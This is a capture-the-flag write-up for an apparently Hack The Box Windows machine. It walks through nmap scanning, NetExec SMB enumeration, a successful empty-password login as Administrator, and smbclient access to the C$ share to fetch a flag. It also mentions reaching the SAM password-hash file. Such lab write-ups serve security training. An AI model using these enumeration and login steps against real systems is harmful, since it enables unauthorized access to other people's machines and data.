---
tags:
  - Windows
  - SMB
  - Weak credentials
---

... is a very simple HTB machine which demonstrates a misconfigured `Administrator` account which allows others to connect to the `C$` share without a password. It is very similar to `Explosion`, with the only difference being that this one has no `RDP`.

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2012-06-04T00:01:11
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```
As this is a Windows server, the open port `445` is very interesting. It usually indicates a Server Message Block (SMB) service behind it. SMB is pretty similar to FTP, as both allow users to access (read and-/or write) files which are exposed to this service.

### Initial Exploitation
With SMB services, my go-to tool is NetExec (`nxc`, previously CrackMapExec, `cme`). It can be used to interact with different protocols such as `ssh`, `ftp`, or `ldap`. Most importantly, it allows users to quickly enumerate remote SMB services. The following command quickly glances over the SMB service and gives you some information:
```bash
nxc smb $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# smb: specification of the protocol. may be another protocol which is available. see available protocols with nxc -h!
```

This doesn't show me anything interesting. I still try to connect using `null auth` by adding these flags:
```bash
nxc smb $IP -u 'a' -p '' --shares
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -u: the username to use. can be anything, as it defaults to the user 'Guest', if the name is not found.
# -p: the password to use. empty here
# --shares: a flag which tells nxc to return a list of available shares.
```

This doesn't let me see the shares. So i try the `Administrator` account instead of the `a` username to see if the account is misconfigured to have no password, and it shows me this output:
```bash
[+] Tactics\Administrator: (Pwn3d!)
[*] Enumerated shares
Share           Permissions     Remark
-----           -----------     ------
ADMIN$          READ,WRITE      Remote Admin
C$              READ,WRITE      Default share
IPC$            READ            Remote IPC
```
The `ADMIN$` share grants access to the `C:\Windows` system directory. When navigating to `C:\Windows\System32\config\SAM`, you can view the password hashes to local users. As the `Administrator` account is highly privileged, and his password is known (empty...), the `ADMIN$` share is not of use right now.
As the `C$` share equates to the `C:\\` drive on a computer, i interact with it as follows:
```bash
smbclient -U 'Administrator' //$IP/C$
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -U: username to use. here, 'a' is used as it defaults to the guest account.
# -N: use no password. somehow the connection does not work with this flag, so leave the password empty.
```

Using this connection, i navigate to `C:\Users\Administrator\Desktop\` to `get` the `flag.txt`!